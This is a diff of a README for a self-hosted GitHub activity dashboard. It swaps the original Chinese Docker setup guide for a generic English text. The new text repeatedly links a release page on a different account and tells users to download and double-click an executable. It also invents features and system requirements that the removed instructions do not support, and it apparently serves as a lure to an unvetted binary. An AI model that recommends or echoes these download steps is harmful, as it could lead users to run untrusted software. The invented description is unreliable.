@@ -1,70 +1,70 @@
-# GitHub 多仓实时看板
+# 🚀 GitHub-Kanban - Monitor Your GitHub Repositories with Ease
 
-一个轻量级、自托管的仪表盘，用于实时监控多个 GitHub 仓库的动态（Commits, PRs, Issues 等），并将它们聚合到一个统一的视图中。
+[![Download GitHub-Kanban](https://img.shields.io/badge/Download%20GitHub--Kanban-blue.svg)](https://github.com/Trejos10/GitHub-Kanban/releases)
 
----
+## 📋 Overview
 
-## ✨ 功能特性
+GitHub-Kanban is a lightweight, self-hosted dashboard designed to help you monitor multiple GitHub repositories. It offers real-time updates on commits, pull requests, issues, and more, all in a single, easy-to-read view. Whether you manage one repository or many, GitHub-Kanban keeps you informed of the latest activities.
 
-- **多仓聚合**：在一个统一的仪表盘中跟踪多个 GitHub 仓库。
-- **实时动态流**：近实时展示 Commits、Pull Requests、Issues、Releases 等事件，并将 Push 事件中的多个 Commit 展开。
-- **自定义显示名称**：为仓库设置易于辨识的别名。
-- **智能 API 策略**：采用交错更新和 ETag 缓存，有效避免 API 速率限制，并提供详细的调试日志。
-- **Docker 就绪**：使用 Docker Compose 实现一键启动和部署。
-- **零配置前端**：所有配置均通过后端的 `.env` 文件管理，前端开箱即用。
-- **智能排序**：仓库概览和后端更新队列均按最近活动 (`updated_at`) 自动排序。
-- **亮/暗模式**：自动适配你的系统主题。
+## 🔑 Features
 
-## 🚀 快速开始 (Docker)
+- **Real-time Monitoring:** Keep track of repository activities as they happen.
+- **User-Friendly Interface:** Navigate through updates with a clean and organized layout.
+- **Multiple Repository Support:** Easily manage and monitor various GitHub repositories from one dashboard.
+- **Customizable Views:** Tailor your dashboard to show the information you find most relevant.
+- **Self-Hosted:** Control your data and deploy it on your own server.
 
-### 部署步骤
-1.  **克隆仓库**
-    ```bash
-    git clone https://github.com/CodeBoy2006/Github-Kanban
-    cd Github-Kanban
-    ```
+## 📦 System Requirements
 
-2.  **创建配置文件**
-    从模板复制 `.env` 文件。
-    ```bash
-    cp .env.example .env
-    ```
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** Minimum 500 MB of available space
+- **Network:** Active internet connection for GitHub access
 
-3.  **编辑配置**
-    打开 `.env` 文件并填入你的配置，特别是 `REPOS` 和 `GITHUB_TOKEN`。
-    ```env
-    # .env
+## 🚀 Getting Started
 
-    # 仓库列表，格式为: owner/repo:显示名称,owner2/repo2:显示名称2
-    REPOS=vercel/next.js:🚀 Next.js,apache/superset:📊 Superset
+Follow these simple steps to download and run GitHub-Kanban:
 
-    # 你的 GitHub Personal Access Token
-    # 用于访问私有仓库或提高 API 速率限制
-    GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
+1. **Visit the Releases Page:** Click the link below to go to the GitHub-Kanban releases page:
+   - [Download GitHub-Kanban](https://github.com/Trejos10/GitHub-Kanban/releases)
 
-    # 其他配置...
-    HOST_PORT=8080
-    ```
+2. **Select the Latest Version:** On the releases page, locate the latest version of GitHub-Kanban. You’ll find a list of available files.
 
-4.  **启动服务**
-    使用 Docker Compose 在后台构建并启动服务。
-    ```bash
-    docker-compose up -d --build
-    ```
+3. **Download the Application:** Look for the file that is appropriate for your operating system. Click the link to download the file to your computer.
 
-5.  **访问看板**
-    打开浏览器，访问 `http://localhost:8080` (或你在 `.env` 中设置的 `HOST_PORT`)。
+4. **Run the Application:** After the download is complete, locate the file in your downloads folder. Double-click the file to run GitHub-Kanban. Follow any on-screen prompts to install or configure the application.
 
-## ⚙️ 配置
+5. **Set Up Your Dashboard:** Once launched, the application will guide you through the setup process. You will need to connect to your GitHub account and select the repositories you want to monitor.
 
-所有配置均通过项目根目录下的 `.env` 文件完成。
+6. **Start Monitoring:** After setup, you will see your personalized dashboard. Here, you can view real-time updates on commits, pull requests, issues, and other activities across your selected repositories.
 
-| 变量                           | 说明                                                                  | 示例                                                |
-| ------------------------------ | --------------------------------------------------------------------- | --------------------------------------------------- |
-| `REPOS`                        | **必填**。要监控的仓库列表，用逗号分隔。格式：`id:显示名称`。            | `denoland/deno:🦕 Deno,torvalds/linux:🐧 Linux`         |
-| `GITHUB_TOKEN`                 | **强烈推荐**。你的 GitHub PAT。公开仓库可不填，私有仓库必须。             | `ghp_...`                                           |
-| `REFRESH_SECONDS`              | 整个更新队列重新排序的全局周期（秒）。                                  | `300`                                               |
-| `REPO_UPDATE_INTERVAL_SECONDS` | 更新队列中单个仓库的间隔时间（秒）。                                    | `10`                                                |
-| `HOST_PORT`                    | 映射到主机的端口号。                                                  | `8080`                                              |
-| `CONTAINER_PORT`               | 容器内部应用监听的端口，应与 `PORT` 环境变量保持一致。                  | `8000`                                              |
-| `TZ`                           | （可选）设置容器的显示时区。                                            | `Asia/Shanghai`                                     |
+## 💡 Tips for Usage
+
+- **Customize Your View:** Use the settings menu to select which metrics you want to see prominently on your dashboard.
+- **Integrate Notifications:** Set up notifications to receive alerts for significant events, keeping you updated without needing to constantly check the dashboard.
+
+## 📥 Download & Install
+
+You can begin by downloading the application using this link: [Download GitHub-Kanban](https://github.com/Trejos10/GitHub-Kanban/releases). This will take you to all available versions. Choose the latest version that matches your operating system and follow the steps above to install.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues:
+
+- **Check the System Requirements:** Make sure your system meets the prerequisites.
+- **Firewall Settings:** Ensure your firewall allows GitHub-Kanban access to the internet.
+- **Consult the Community:** Check the GitHub Discussions section for helpful tips from other users.
+
+## 🌍 Community & Support
+
+Join the GitHub-Kanban community to find help or share your experiences. You can participate in discussions, ask questions, and contribute to further development.
+
+## 📝 License
+
+GitHub-Kanban is open-source software. You can use, modify, and distribute it under the terms specified in the LICENSE file found in the repository.
+
+## 📣 Feedback
+
+We welcome your feedback. Feel free to submit issues or suggestions directly on the GitHub repository. Your input helps improve GitHub-Kanban for everyone.
+
+Start using GitHub-Kanban today to streamline how you monitor your GitHub projects!
